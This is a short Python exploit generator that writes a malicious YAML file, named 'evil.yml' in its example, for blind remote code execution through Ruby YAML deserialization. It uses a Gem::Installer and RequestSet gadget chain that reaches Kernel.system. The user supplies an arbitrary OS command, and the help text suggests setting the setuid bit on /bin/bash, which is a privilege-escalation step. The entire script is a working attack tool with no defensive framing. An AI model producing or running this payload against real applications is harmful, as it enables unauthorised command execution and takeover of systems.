#!/usr/bin/python3

from argparse import ArgumentParser

ap = ArgumentParser(usage=" -c <command> -n <filename>")
ap.add_argument('-c','--command',dest='runcmd',help='OS command, example:chmod u+s /bin/bash',required=True)
ap.add_argument('-n','--name',dest='file_name',help='FileName of evil yml file, example: evil.yml',required=True)


def init():
    banner = """
    +-------------------------------+
    |Blind_Remote_Code_Execution    |
    |through YAML Deserialization...|
    +-------------------------------+
    """
    print(banner)

    


def import_command(runcmd,file_name):

    yml_template = """
    ---
 - !ruby/object:Gem::Installer
     i: x
 - !ruby/object:Gem::SpecFetcher
     i: y
 - !ruby/object:Gem::Requirement
   requirements:
     !ruby/object:Gem::Package::TarReader
     io: &1 !ruby/object:Net::BufferedIO
       io: &1 !ruby/object:Gem::Package::TarReader::Entry
          read: 0
          header: "abc"
       debug_output: &1 !ruby/object:Net::WriteAdapter
          socket: &1 !ruby/object:Gem::RequestSet
              sets: !ruby/object:Net::WriteAdapter
                  socket: !ruby/module 'Kernel'
                  method_id: :system
              git_set: {{run_cmd}}
          method_id: :resolve
    """

    yml_template = yml_template.replace("{{run_cmd}}",runcmd)
    
    f = open(file_name,"w")
    f.write(yml_template)
    f.close()
    
    print(f"[+]File Created: {file_name}")
    print(f"[+]Import CMD  : {runcmd}")




if __name__ == "__main__":
    args = ap.parse_args()
    runcmd = args.runcmd
    file_name = args.file_name
    init()
    import_command(runcmd,file_name)
    
    



